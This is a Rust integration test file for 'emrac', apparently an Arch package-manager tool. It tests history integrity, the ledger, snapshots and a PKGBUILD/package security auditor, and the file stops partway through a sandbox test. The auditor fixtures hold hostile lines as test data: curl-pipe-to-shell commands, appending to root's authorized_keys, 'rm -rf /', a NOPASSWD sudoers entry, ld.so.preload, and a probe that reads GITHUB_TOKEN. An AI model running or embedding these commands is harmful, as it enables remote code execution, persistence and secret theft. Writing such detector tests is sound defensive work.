//! Runs the real `emrac` binary. Only commands that need neither pacman nor a
//! network are used, each against a scratch `$HOME`, so these run anywhere.

use std::fs;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};

struct Home(PathBuf);

impl Home {
    fn new(tag: &str) -> Self {
        let dir = std::env::temp_dir().join(format!("emrac-cli-{tag}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        Home(dir)
    }

    fn data(&self) -> PathBuf {
        let dir = self.0.join(".local/share/emrac");
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn command(&self, args: &[&str]) -> Command {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_emrac"));
        cmd.args(args)
            .env("HOME", &self.0)
            .env("EMRAC_LEDGER", self.0.join("ledger.jsonl"))
            .env_remove("XDG_CONFIG_HOME")
            .env_remove("XDG_DATA_HOME");
        // These tests run inside `makepkg`'s `check()` too, where `emrac self
        // upgrade` (and many AUR helpers) set where packages and sources go.
        // A package one test builds must not be found by another.
        for var in ["PKGDEST", "SRCDEST", "SRCPKGDEST", "LOGDEST", "BUILDDIR"] {
            cmd.env_remove(var);
        }
        cmd
    }

    fn run(&self, args: &[&str]) -> Output {
        self.command(args).output().unwrap()
    }
}

impl Drop for Home {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn stdout(o: &Output) -> String {
    String::from_utf8_lossy(&o.stdout).into_owned()
}

fn stderr(o: &Output) -> String {
    String::from_utf8_lossy(&o.stderr).into_owned()
}

fn write(path: &Path, text: &str) {
    fs::write(path, text).unwrap();
}

#[test]
fn version_and_help_succeed() {
    let home = Home::new("version");
    let out = home.run(&["--version"]);
    assert_eq!(out.status.code(), Some(0));
    assert!(stdout(&out).starts_with("emrac "), "{}", stdout(&out));
    assert!(
        stdout(&out).contains(
            "built by pardhuvarmax\nSic Mundus Creatus Est.\nhttps://github.com/pardhuvarmax/emrac"
        ),
        "{}",
        stdout(&out)
    );

    let out = home.run(&["--help"]);
    assert_eq!(out.status.code(), Some(0));
    assert!(
        stdout(&out).contains("Built by pardhuvarmax — https://github.com/pardhuvarmax/emrac\nSic Mundus Creatus Est."),
        "help lacks the credit"
    );
    for cmd in [
        "install", "rollback", "snapshot", "restore", "pin", "orphans",
    ] {
        assert!(stdout(&out).contains(cmd), "help lacks {cmd}");
    }
}

#[test]
fn usage_errors_exit_2() {
    let home = Home::new("usage");
    assert_eq!(home.run(&[]).status.code(), Some(2));
    assert_eq!(home.run(&["frobnicate"]).status.code(), Some(2));
    assert_eq!(
        home.run(&["install"]).status.code(),
        Some(2),
        "missing package"
    );
    assert_eq!(home.run(&["pin", "--until"]).status.code(), Some(2));
}

#[test]
fn completion_prints_a_script_for_each_shell() {
    let home = Home::new("completion");
    for shell in ["bash", "zsh", "fish"] {
        let out = home.run(&["completion", shell]);
        assert_eq!(out.status.code(), Some(0), "{shell}");
        assert!(stdout(&out).contains("emrac"), "{shell}");
    }
    assert_eq!(
        home.run(&["completion", "powershell"]).status.code(),
        Some(2)
    );
}

#[test]
fn config_round_trip_and_errors() {
    let home = Home::new("config");
    let out = home.run(&["config", "get", "flags.yes"]);
    assert_eq!(stdout(&out).trim(), "false");

    let out = home.run(&["config", "set", "flags.yes", "true"]);
    assert_eq!(out.status.code(), Some(0));
    assert_eq!(
        stdout(&home.run(&["config", "get", "flags.yes"])).trim(),
        "true"
    );
    assert!(home.0.join(".config/emrac/config.toml").exists());

    home.run(&["config", "unset", "flags.yes"]);
    assert_eq!(
        stdout(&home.run(&["config", "get", "flags.yes"])).trim(),
        "false"
    );

    let out = home.run(&["config", "get", "no.such.key"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).starts_with("emrac found:"), "{}", stderr(&out));
    assert!(stdout(&out).is_empty(), "errors go to stderr only");

    let out = home.run(&["config", "set", "flags.yes", "maybe"]);
    assert_eq!(out.status.code(), Some(1));
}

#[test]
fn history_is_empty_without_a_log_and_reads_one() {
    let home = Home::new("history");
    let out = home.run(&["history"]);
    assert_eq!(out.status.code(), Some(0));
    assert!(stdout(&out).contains("no transactions"), "{}", stdout(&out));
    assert_eq!(stdout(&home.run(&["history", "--json"])).trim(), "[]");

    write(
        &home.data().join("history.jsonl"),
        concat!(
            r#"{"id":"tx-1","timestamp":1790000000,"action":"install","packages":[{"name":"tree","version":"2.3.2-1","repo":"extra","explicit":true}],"status":"committed"}"#,
            "\n",
            "not json at all\n",
            r#"{"id":"tx-2","timestamp":1790000100,"action":"remove","packages":[{"name":"tree","version":"2.3.2-1","repo":"local","explicit":true}],"status":"failed","error":"boom"}"#,
            "\n",
        ),
    );
    let out = home.run(&["history"]);
    let text = stdout(&out);
    assert!(text.contains("tx-1") && text.contains("tx-2"), "{text}");
    let json: serde_json::Value =
        serde_json::from_str(&stdout(&home.run(&["history", "--json"]))).unwrap();
    assert_eq!(json.as_array().unwrap().len(), 2, "the bad line is skipped");
    assert_eq!(json[0]["id"], "tx-2", "newest first");

    let out = home.run(&["history", "--since", "yesterday"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).contains("YYYY-MM-DD"));
}

fn run_answering(home: &Home, args: &[&str], answer: &str) -> Output {
    use std::io::Write;
    use std::process::Stdio;

    let mut child = home
        .command(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(answer.as_bytes())
        .unwrap();
    child.wait_with_output().unwrap()
}

#[test]
fn history_archive_verify_and_ack() {
    let home = Home::new("history-integrity");
    let log = home.data().join("history.jsonl");
    // 30 transactions from long ago, written the way an older emrac did (no chain).
    let lines: Vec<String> = (1..=30)
        .map(|n| {
            let status = if n == 5 || n == 25 { "failed" } else { "committed" };
            format!(
                r#"{{"id":"tx-{n}","timestamp":{},"action":"install","packages":[{{"name":"tree","version":"2.3.2-1","repo":"extra","explicit":true}}],"status":"{status}"}}"#,
                1_000_000_000 + n * 100
            )
        })
        .collect();
    write(&log, &(lines.join("\n") + "\n"));

    let out = home.run(&["history", "verify"]);
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    assert!(
        stdout(&out).contains("30 earlier lines predate"),
        "{}",
        stdout(&out)
    );

    // Shorter than the cache window: refused with the reason.
    let out = home.run(&["history", "archive", "--older-than", "3d"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).contains("cache.keep_days"), "{}", stderr(&out));

    // A dry run and a closed stdin move nothing.
    let before = fs::read_to_string(&log).unwrap();
    let out = home.run(&["history", "archive", "--older-than", "30d", "--dry-run"]);
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    assert!(
        stdout(&out).contains("10 transactions would move"),
        "{}",
        stdout(&out)
    );
    let out = home.run(&["history", "archive", "--older-than", "30d", "--yes"]);
    assert!(
        stderr(&out).contains("emrac refuses: no answer came"),
        "{}",
        stderr(&out)
    );
    assert_eq!(
        fs::read_to_string(&log).unwrap(),
        before,
        "--yes does not answer"
    );

    let out = run_answering(&home, &["history", "archive", "--older-than", "30d"], "y\n");
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    assert!(
        stdout(&out).contains("archived 10 transactions"),
        "{}",
        stdout(&out)
    );
    assert!(home
        .data()
        .join("history-archive/tx-1-to-tx-10.jsonl")
        .exists());

    let out = home.run(&["history", "verify"]);
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    assert!(stdout(&out).contains("1 archive file"), "{}", stdout(&out));
    let live: serde_json::Value =
        serde_json::from_str(&stdout(&home.run(&["history", "--json"]))).unwrap();
    assert_eq!(live.as_array().unwrap().len(), 20);
    let all: serde_json::Value =
        serde_json::from_str(&stdout(&home.run(&["history", "--archive", "--json"]))).unwrap();
    assert_eq!(all.as_array().unwrap().len(), 30);
    assert!(stdout(&home.run(&["history"])).contains("10 older transactions archived"));

    // Acknowledge a failure: it stays, and says so.
    let out = home.run(&["history", "ack", "tx-25"]);
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    let text = stdout(&home.run(&["history"]));
    assert!(text.contains("FAILED (acknowledged)"), "{text}");
    let out = home.run(&["history", "ack", "tx-1"]);
    assert_eq!(
        out.status.code(),
        Some(1),
        "an archived record is not in the live log"
    );
    let out = home.run(&["history", "ack", "tx-24"]);
    assert_eq!(
        out.status.code(),
        Some(1),
        "a committed one has nothing to acknowledge"
    );
    assert_eq!(home.run(&["history", "ack"]).status.code(), Some(2));

    // Editing a line outside emrac is caught.
    let edited = fs::read_to_string(&log)
        .unwrap()
        .replacen("tx-30", "tx-X", 1);
    write(&log, &edited);
    let out = home.run(&["history", "verify"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).contains("does not verify"), "{}", stderr(&out));
}

#[test]
fn the_ledger_holds_a_second_copy_and_repairs_the_history() {
    let home = Home::new("ledger");
    let log = home.data().join("history.jsonl");
    let ledger = home.0.join("ledger.jsonl");
    let lines: Vec<String> = (1..=3)
        .map(|n| {
            format!(
                r#"{{"id":"tx-{n}","timestamp":{},"action":"install","packages":[{{"name":"tree","version":"2.3.2-1","repo":"extra","explicit":true}}],"status":"committed"}}"#,
                1_000_000_000 + n * 100
            )
        })
        .collect();
    write(&log, &(lines.join("\n") + "\n"));

    let out = home.run(&["history", "verify"]);
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    assert!(stdout(&out).contains("no ledger yet"), "{}", stdout(&out));

    let out = home.run(&["history", "sync"]);
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    assert!(stdout(&out).contains("sent 3 lines"), "{}", stdout(&out));
    assert!(ledger.exists());
    assert!(stdout(&home.run(&["history", "verify"])).contains("the ledger agrees"));
    assert!(stdout(&home.run(&["history", "sync"])).contains("already holds everything"));

    // doctor sees it
    let doc = stdout(&home.run(&["doctor", "--json"]));
    assert!(doc.contains("\"ledger\""), "{doc}");

    // The helper refuses what is not a history line, and writes nothing.
    let before = fs::read_to_string(&ledger).unwrap();
    let out = run_answering(&home, &["ledger-append"], "{\"type\":\"shell\"}\n");
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).contains("ledger refused"), "{}", stderr(&out));
    assert_eq!(fs::read_to_string(&ledger).unwrap(), before);

    // Edit one record: verify names it and exits 1; repair needs a real yes.
    let broken = fs::read_to_string(&log)
        .unwrap()
        .replacen("install", "remove", 1);
    write(&log, &broken);
    let out = home.run(&["history", "verify"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(
        stderr(&out).contains("changed since they were recorded: tx-1"),
        "{}",
        stderr(&out)
    );
    let out = home.run(&["history", "verify", "--repair", "--yes"]);
    assert!(
        stderr(&out).contains("emrac refuses: no answer came"),
        "{}",
        stderr(&out)
    );
    assert_eq!(
        fs::read_to_string(&log).unwrap(),
        broken,
        "--yes does not answer"
    );

    let out = run_answering(&home, &["history", "verify", "--repair"], "y\n");
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    assert_eq!(fs::read_to_string(&log).unwrap(), lines.join("\n") + "\n");
    assert!(home.data().join("history.jsonl.broken").exists());
    assert_eq!(home.run(&["history", "verify"]).status.code(), Some(0));

    // Delete the whole history: the ledger brings it back.
    fs::remove_file(&log).unwrap();
    let out = home.run(&["history", "verify"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(
        stderr(&out).contains("tx-1, tx-2, tx-3"),
        "{}",
        stderr(&out)
    );
    let out = run_answering(&home, &["history", "verify", "--repair"], "y\n");
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    assert_eq!(home.run(&["history", "--json"]).status.code(), Some(0));
    let json: serde_json::Value =
        serde_json::from_str(&stdout(&home.run(&["history", "--json"]))).unwrap();
    assert_eq!(json.as_array().unwrap().len(), 3);
}

#[test]
fn an_anchor_taken_earlier_catches_a_cut_off_tail() {
    let home = Home::new("anchor");
    let log = home.data().join("history.jsonl");
    let lines: Vec<String> = (1..=3)
        .map(|n| {
            let status = if n == 1 { "committed" } else { "failed" };
            format!(
                r#"{{"id":"tx-{n}","timestamp":{},"action":"install","packages":[{{"name":"tree","version":"2.3.2-1","repo":"extra","explicit":true}}],"status":"{status}"}}"#,
                1_000_000_000 + n * 100
            )
        })
        .collect();
    write(&log, &(lines.join("\n") + "\n"));

    // Nothing is chained yet: no anchor.
    let out = home.run(&["history", "anchor"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(
        stderr(&out).contains("nothing in the history is chained"),
        "{}",
        stderr(&out)
    );

    // Acknowledgements are chained lines (after the chain-start): seq 2, then 3.
    assert_eq!(home.run(&["history", "ack", "tx-2"]).status.code(), Some(0));
    assert_eq!(home.run(&["history", "ack", "tx-3"]).status.code(), Some(0));
    let out = home.run(&["history", "anchor"]);
    let code = stdout(&out).lines().next().unwrap().to_string();
    assert!(code.starts_with("3:"), "{code}");

    let out = home.run(&["history", "verify", "--against", &code]);
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    assert!(
        stdout(&out).contains("still matches the anchor"),
        "{}",
        stdout(&out)
    );

    assert_eq!(
        home.run(&["history", "verify", "--against", "nonsense"])
            .status
            .code(),
        Some(1)
    );

    // (The ledger would notice the missing line too; take it away to show
    // that the anchor does not need it.)
    fs::remove_file(home.0.join("ledger.jsonl")).unwrap();
    // Cut the last line off: the chain alone is still fine, the anchor is not.
    let text = fs::read_to_string(&log).unwrap();
    let mut kept: Vec<&str> = text.lines().collect();
    kept.pop();
    write(&log, &(kept.join("\n") + "\n"));
    assert_eq!(home.run(&["history", "verify"]).status.code(), Some(0));
    let out = home.run(&["history", "verify", "--against", &code]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).contains("cut off the end"), "{}", stderr(&out));
}

#[test]
fn the_watch_install_asks_for_root_and_the_helper_stays_hidden() {
    let home = Home::new("watch");
    let out = home.run(&["ledger", "watch", "install"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).contains("needs root"), "{}", stderr(&out));
    assert!(!stdout(&home.run(&["--help"])).contains("ledger-append"));
}

#[test]
fn every_help_screen_carries_the_credit() {
    let home = Home::new("help-credit");
    for args in [
        &["--help"][..],
        &["install", "--help"],
        &["history", "archive", "--help"],
        &["ledger", "watch", "install", "--help"],
        &["help", "undo"],
        &["cache", "clean", "-h"],
    ] {
        let text = stdout(&home.run(args));
        assert!(!text.contains("RUN AS ROOT"), "{args:?}: {text}");
        assert!(
            text.trim_end().ends_with("Built by pardhuvarmax — https://github.com/pardhuvarmax/emrac\nSic Mundus Creatus Est."),
            "{args:?}: {text}"
        );
    }
}

fn snapshot_json(name: &str, count: usize) -> String {
    let packages: Vec<String> = (0..count)
        .map(|i| {
            format!(r#"{{"name":"pkg{i:05}","version":"1.0-1","explicit":true,"foreign":false}}"#)
        })
        .collect();
    format!(
        r#"{{"name":"{name}","timestamp":1790000000,"note":"a note","packages":[{}]}}"#,
        packages.join(",")
    )
}

#[test]
fn snapshots_list_show_delete() {
    let home = Home::new("snapshot");
    let out = home.run(&["snapshot", "list"]);
    assert_eq!(out.status.code(), Some(0));
    assert!(stdout(&out).contains("no snapshots"));

    let dir = home.data().join("snapshots");
    fs::create_dir_all(&dir).unwrap();
    write(&dir.join("mine.json"), &snapshot_json("mine", 3));

    let out = home.run(&["snapshot", "list"]);
    assert!(stdout(&out).contains("mine") && stdout(&out).contains("3 packages"));
    let out = home.run(&["snapshot", "show", "mine"]);
    assert!(stdout(&out).contains("pkg00002") && stdout(&out).contains("a note"));
    let json: serde_json::Value =
        serde_json::from_str(&stdout(&home.run(&["snapshot", "list", "--json"]))).unwrap();
    assert_eq!(json[0]["name"], "mine");

    let out = home.run(&["snapshot", "show", "nope"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).contains("no snapshot named 'nope'"));
    let out = home.run(&["snapshot", "show", "../etc/passwd"]);
    assert_eq!(out.status.code(), Some(1), "names are validated");

    assert_eq!(
        home.run(&["snapshot", "delete", "mine"]).status.code(),
        Some(0)
    );
    assert!(!dir.join("mine.json").exists());
    assert_eq!(
        home.run(&["snapshot", "delete", "mine"]).status.code(),
        Some(1)
    );
}

#[test]
fn pins_list_and_unpin() {
    let home = Home::new("pins");
    let out = home.run(&["pin"]);
    assert_eq!(out.status.code(), Some(0));
    assert!(stdout(&out).contains("nothing is pinned"));

    write(
        &home.data().join("pins.json"),
        r#"[{"name":"old","reason":"stale","until":1000,"created":1},
            {"name":"keep","reason":"driver","created":2}]"#,
    );
    let out = home.run(&["pin"]);
    let text = stdout(&out);
    assert!(text.contains("keep") && text.contains("driver"), "{text}");
    let old_line = text.lines().find(|l| l.contains("old")).unwrap();
    assert!(old_line.contains("[expired]"), "{text}");
    assert!(!text
        .lines()
        .find(|l| l.contains("keep"))
        .unwrap()
        .contains("[expired]"));

    let out = home.run(&["unpin", "old", "ghost"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).contains("ghost"));
    assert!(
        stdout(&home.run(&["pin"])).contains("old"),
        "nothing removed on error"
    );

    assert_eq!(home.run(&["unpin", "old"]).status.code(), Some(0));
    assert!(!stdout(&home.run(&["pin"])).contains("old"));

    write(&home.data().join("pins.json"), "{broken");
    let out = home.run(&["pin"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).contains("can't be read"));
}

#[test]
fn closing_the_pipe_early_does_not_panic() {
    let home = Home::new("pipe");
    let dir = home.data().join("snapshots");
    fs::create_dir_all(&dir).unwrap();
    // Far more than a pipe buffer's worth of output.
    write(&dir.join("big.json"), &snapshot_json("big", 20_000));

    let mut child = home
        .command(&["snapshot", "show", "big"])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    // Read a little, then hang up like `head` does.
    let mut stdout = child.stdout.take().unwrap();
    let mut first = [0u8; 64];
    stdout.read_exact(&mut first).unwrap();
    drop(stdout);

    let mut err = String::new();
    child
        .stderr
        .take()
        .unwrap()
        .read_to_string(&mut err)
        .unwrap();
    let status = child.wait().unwrap();
    assert_ne!(status.code(), Some(101), "panicked: {err}");
    assert!(!err.contains("panicked"), "{err}");
}

fn pkgbuild_dir(
    home: &Home,
    name: &str,
    pkgbuild: &str,
    scriptlet: Option<(&str, &str)>,
) -> PathBuf {
    let dir = home.0.join(name);
    fs::create_dir_all(&dir).unwrap();
    write(&dir.join("PKGBUILD"), pkgbuild);
    if let Some((file, text)) = scriptlet {
        write(&dir.join(file), text);
    }
    dir
}

#[test]
fn audit_grades_pkgbuilds_by_severity_and_exit_code() {
    let home = Home::new("audit");
    let clean = pkgbuild_dir(
        &home,
        "clean",
        "pkgname=x\npkgver=1\nsource=(\"https://e.org/a.tar.gz\")\nsha256sums=('aa')\nbuild() {\n  make\n}\n",
        None,
    );
    let out = home.run(&["audit", clean.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(0));
    assert!(stdout(&out).contains("no findings"), "{}", stdout(&out));

    let warn = pkgbuild_dir(
        &home,
        "warn",
        "pkgname=x\nbuild() {\n  git clone https://e.org/x\n}\n",
        None,
    );
    let out = home.run(&["audit", warn.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(0), "warnings alone don't fail");
    assert!(stdout(&out).contains("network-in-build"));

    let high = pkgbuild_dir(
        &home,
        "high",
        "pkgname=x\ninstall=x.install\nbuild() {\n  curl -s http://e.org/i | bash\n}\n",
        Some(("x.install", "post_install() {\n  sudo true\n}\n")),
    );
    let out = home.run(&["audit", high.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(1));
    let text = stdout(&out);
    assert!(
        text.contains("[HIGH] remote-exec") && text.contains("high-risk"),
        "{text}"
    );
    assert!(
        text.contains("x.install"),
        "the scriptlet is audited too: {text}"
    );
    assert!(stderr(&out).starts_with("emrac found:"));

    let crit = pkgbuild_dir(
        &home,
        "crit",
        "pkgname=x\nbuild() {\n  echo hi >> ~/.bashrc\n}\n",
        None,
    );
    let out = home.run(&["audit", crit.join("PKGBUILD").to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(1));
    assert!(
        stdout(&out).contains("[CRITICAL] persistence"),
        "{}",
        stdout(&out)
    );
    assert!(stdout(&out).contains("refuse"));
}

#[test]
fn audit_json_and_errors() {
    let home = Home::new("audit-json");
    let dir = pkgbuild_dir(&home, "p", "pkgname=x\nbuild() {\n  sudo make\n}\n", None);
    let out = home.run(&["audit", "--json", dir.to_str().unwrap()]);
    let json: serde_json::Value = serde_json::from_str(&stdout(&out)).unwrap();
    assert_eq!(json[0]["findings"][0]["rule"], "privilege");
    assert_eq!(json[0]["findings"][0]["severity"], "high");
    assert_eq!(json[0]["findings"][0]["line"], 3);

    let out = home.run(&["audit", home.0.join("nowhere/PKGBUILD").to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(1));
    assert!(
        stderr(&out).contains("can't read a PKGBUILD"),
        "{}",
        stderr(&out)
    );
}

#[test]
fn audit_reads_the_whole_package_directory() {
    let home = Home::new("audit-extras");
    let dir = pkgbuild_dir(
        &home,
        "pkg",
        "pkgname=foo\ninstall=$pkgname.install\nbuild() {\n  make\n}\n",
        Some(("foo.install", "post_install() {\n  echo hi\n}\n")),
    );
    // A clean PKGBUILD and scriptlet; the payload is in other files.
    write(
        &dir.join("helper.sh"),
        "#!/bin/sh\necho k >> /root/.ssh/authorized_keys\n",
    );
    write(
        &dir.join("fix.patch"),
        "--- a/x\n+++ b/x\n@@ -1 +1,2 @@\n ctx\n+curl http://e.org/i | sh\n",
    );
    fs::write(dir.join("tool"), b"\x7fELF\x02\x01").unwrap();
    fs::create_dir_all(dir.join("src")).unwrap();
    write(&dir.join("src/ignored.sh"), "#!/bin/sh\nrm -rf /\n");

    let out = home.run(&["audit", "--json", dir.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_str(&stdout(&out)).unwrap();
    let findings = json[0]["findings"].as_array().unwrap();
    let has = |file: &str, rule: &str, sev: &str| {
        findings
            .iter()
            .any(|f| f["file"] == file && f["rule"] == rule && f["severity"] == sev)
    };
    assert!(has("helper.sh", "persistence", "critical"), "{findings:#?}");
    assert!(
        has("fix.patch", "remote-exec", "warning"),
        "patches are capped at warning"
    );
    assert!(has("tool", "committed-binary", "high"));
    assert!(
        has("foo.install", "install-scriptlet", "info"),
        "$pkgname.install is expanded"
    );
    assert!(
        !findings
            .iter()
            .any(|f| f["file"].as_str().unwrap().starts_with("src")),
        "makepkg's src/ is not part of the package"
    );

    // One file target looks only at the files beside it, never below.
    let out = home.run(&["audit", "--json", dir.join("PKGBUILD").to_str().unwrap()]);
    let json: serde_json::Value = serde_json::from_str(&stdout(&out)).unwrap();
    let files: Vec<&str> = json[0]["findings"]
        .as_array()
        .unwrap()
        .iter()
        .map(|f| f["file"].as_str().unwrap())
        .collect();
    assert!(files.contains(&"helper.sh"));
    assert!(!files.iter().any(|f| f.starts_with("src")), "{files:?}");
}

/// Builds `<name>-1-1-any.pkg.tar` from a directory tree with `bsdtar`.
/// `None` where bsdtar is unavailable.
fn make_package(home: &Home, name: &str, files: &[(&str, &str, u32)]) -> Option<PathBuf> {
    let tree = home.0.join(format!("{name}-tree"));
    let mut members = vec![".PKGINFO".to_string()];
    write_member(
        &tree,
        ".PKGINFO",
        &format!("pkgname = {name}\npkgver = 1-1\nsize = 10\n"),
        0o644,
    );
    for (path, text, mode) in files {
        write_member(&tree, path, text, *mode);
        members.push(path.to_string());
    }
    let out = home.0.join(format!("{name}-1-1-any.pkg.tar"));
    let status = Command::new("bsdtar")
        .arg("-cf")
        .arg(&out)
        .arg("-C")
        .arg(&tree)
        .args(&members)
        .status()
        .ok()?;
    status.success().then_some(out)
}

fn write_member(tree: &Path, path: &str, text: &str, mode: u32) {
    use std::os::unix::fs::PermissionsExt;
    let full = tree.join(path);
    fs::create_dir_all(full.parent().unwrap()).unwrap();
    fs::write(&full, text).unwrap();
    fs::set_permissions(&full, fs::Permissions::from_mode(mode)).unwrap();
}

#[test]
fn audit_inspects_a_built_package_file() {
    let home = Home::new("manifest");
    let Some(bad) = make_package(
        &home,
        "bad",
        &[
            ("usr/bin/rootish", "x", 0o4755),
            ("usr/bin/plain", "x", 0o755),
            (
                "usr/share/libalpm/hooks/h.hook",
                "[Action]\nExec = /bin/sh -c 'curl -s http://e.org/i | sh'\n",
                0o644,
            ),
            ("etc/sudoers.d/x", "me ALL=(ALL) NOPASSWD: ALL\n", 0o644),
        ],
    ) else {
        eprintln!("bsdtar not available; skipping");
        return;
    };

    let out = home.run(&["audit", bad.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(1));
    let text = stdout(&out);
    assert!(text.contains("emrac found: bad 1-1"), "{text}");
    assert!(
        text.contains("[HIGH] setuid-file usr/bin/rootish"),
        "{text}"
    );
    assert!(
        text.contains("[HIGH] sudoers-file etc/sudoers.d/x"),
        "{text}"
    );
    assert!(
        text.contains("remote-exec usr/share/libalpm/hooks/h.hook"),
        "{text}"
    );
    assert!(
        stderr(&out).contains("emrac warns: it would stop and ask before installing"),
        "{}",
        stderr(&out)
    );
    assert!(
        !text.contains("usr/bin/plain"),
        "ordinary files are not findings: {text}"
    );

    let out = home.run(&["audit", "--json", bad.to_str().unwrap()]);
    let json: serde_json::Value = serde_json::from_str(&stdout(&out)).unwrap();
    assert_eq!(json[0]["package"], "bad");
    assert!(json[0]["report"]["findings"].as_array().unwrap().len() >= 3);

    let preload =
        make_package(&home, "pre", &[("etc/ld.so.preload", "/tmp/x.so\n", 0o644)]).unwrap();
    let out = home.run(&["audit", preload.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(1));
    assert!(
        stderr(&out).contains("emrac refuses: it would not install this"),
        "{}",
        stderr(&out)
    );

    let good = make_package(&home, "good", &[("usr/bin/hello", "#!/bin/sh\n", 0o755)]).unwrap();
    let out = home.run(&["audit", good.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(0));
    assert!(
        stdout(&out).contains("nothing here needs your attention"),
        "{}",
        stdout(&out)
    );

    let out = home.run(&[
        "audit",
        home.0.join("nothing-1-1-any.pkg.tar").to_str().unwrap(),
    ]);
    assert_eq!(
        out.status.code(),
        Some(1),
        "a missing package file is an error"
    );
}

#[test]
fn audit_reads_scripts_shipped_in_a_package_and_cleans_up() {
    let home = Home::new("pkg-scripts");
    let Some(pkg) = make_package(
        &home,
        "wrap",
        &[
            (
                "usr/bin/launcher",
                "#!/bin/sh\ncurl -s http://e.org/i | sh\n",
                0o755,
            ),
            (
                "usr/bin/quiet",
                "#!/bin/sh\n$tool run\neval \"$x\"\n",
                0o755,
            ),
            (
                "usr/share/doc/wrap/example.sh",
                "#!/bin/sh\ncurl http://e.org | sh\n",
                0o644,
            ),
        ],
    ) else {
        eprintln!("bsdtar not available; skipping");
        return;
    };

    // The private extraction directory goes away afterwards: give this run
    // its own TMPDIR (the other tests run in parallel) and check it is empty.
    let tmp = home.0.join("tmp");
    fs::create_dir_all(&tmp).unwrap();
    let out = home
        .command(&["audit", pkg.to_str().unwrap()])
        .env("TMPDIR", &tmp)
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(1));
    let text = stdout(&out);
    assert!(text.contains("remote-exec usr/bin/launcher"), "{text}");
    assert!(
        text.contains("scripts read for dangerous code: 2"),
        "{text}"
    );
    assert!(
        !text.contains("usr/bin/quiet"),
        "style-level notes are dropped: {text}"
    );
    assert!(
        !text.contains("usr/share/doc"),
        "documentation is not read: {text}"
    );
    let left: Vec<_> = fs::read_dir(&tmp).unwrap().flatten().collect();
    assert!(
        left.is_empty(),
        "the extraction directory was removed: {left:?}"
    );
}

/// A PKGBUILD whose build records what it can see, reach and touch. The
/// package it makes is the evidence. `port` is a local listener standing in
/// for "the network".
fn probe_pkgbuild(port: u16) -> String {
    format!(
        r#"pkgname=sbprobe
pkgver=1
pkgrel=1
arch=(any)
license=(MIT)
build() {{
  curl -s -m 3 -o /dev/null http://127.0.0.1:{port}/ || true
  {{
    echo "token=${{GITHUB_TOKEN:-none}}"
    echo "agent=${{SSH_AUTH_SOCK:-none}}"
    echo "home=[$(ls -A "$HOME" 2>/dev/null | tr '\n' ' ')]"
    echo "etc=$(echo x > /etc/emrac-probe 2>/dev/null && echo writable || echo readonly)"
    echo x > "$HOME/emrac-probe-leak"
  }} > "$srcdir/report.txt"
}}
package() {{
  install -Dm644 "$srcdir/report.txt" "$pkgdir/usr/share/sbprobe/report.txt"
}}
"#
    )
}

/// Can a sandbox and makepkg run here at all? (CI containers often can't.)
fn sandbox_usable() -> bool {
    // The same arguments emrac's own probe uses, including a fresh /proc and
    // /tmp: a clean chroot or a container may allow the rest and forbid
    // mounting /proc, and the tests must skip there rather than fail.
    let bwrap = Command::new("bwrap")
        .args([
            "--unshare-all",
            "--ro-bind",
            "/",
            "/",
            "--dev",
            "/dev",
            "--proc",
            "/proc",
            "--tmpfs",
            "/tmp",
            "true",
        ])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false);
    bwrap
        && Command::new("makepkg")
            .arg("--version")
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false)
}

#[test]
fn the_sandbox_hides_the_network_secrets_and_home_from_a_build() {
    use std::net::TcpListener;
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::Arc;

    if !sandbox_usable() {
        eprintln!("bwrap/makepkg not usable here; skipping");
        return;
    }
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let hits = Arc::new(AtomicUsize::new(0));
    let counter = Arc::clone(&hits);
    std::thread::spawn(move || {
        for conn in listener.incoming().flatten() {
            counter.fetch_add(1, Ordering::SeqCst);
            drop(conn);
        }
    });

